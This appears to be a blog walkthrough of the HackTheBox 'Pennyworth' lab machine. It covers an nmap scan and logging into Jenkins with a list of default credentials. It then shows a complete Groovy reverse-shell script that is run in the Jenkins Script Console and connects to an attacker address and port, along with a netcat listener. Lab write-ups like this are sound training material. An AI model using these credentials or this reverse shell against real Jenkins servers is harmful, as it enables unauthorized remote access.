---
title: "HackTheBox - Pennyworth"
author: Nasrallah
description: ""
date: 2022-07-01 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, jenkins, groovy]
img_path: /assets/img/hackthebox/machines/pennyworth/
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Pennyworth](https://app.hackthebox.com/starting-point?tier=1) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.193.169 (10.129.193.169)
Host is up (1.2s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.39.v20210325)
```

Found port 8080 open running jetty web server.

### Web

Let's navigate to port 8080.

![](1.png)

Found a login page for Jenkins.

#### ffuf

Let's run a directory scan.

![](2.png)

Let's navigate to **/oops** page.

![](3.png)

This page reveals Jenkins version number. This version doesn't seem to be vulnerable to anything serious.

Let's try some default default credentials and attempt to login.

```text
 - admin:admin
 - admin:password
 - admin:qwerty123
 - admin:root
 - root:root
 - root:admin
 - root:password
```

We managed to login using `root:password`.

## **Foothold**

Now that we managed to login as root, we can use script console to get a reverse shell.

At Jenkins Dashboard go to Manage Jenkins and then select Script Console.

![](4.png)

At the script console, we can run any Groovy program code we want. So we will run the following script that would give us a reverse shell.

```groovy
String host="10.10.10.10";
int port=9001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![](6.png)

Next we need to setup a netcat listener to receive the shell.`nc -lvnp 9001`.

Now press run and you should get a shell.

![](7.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
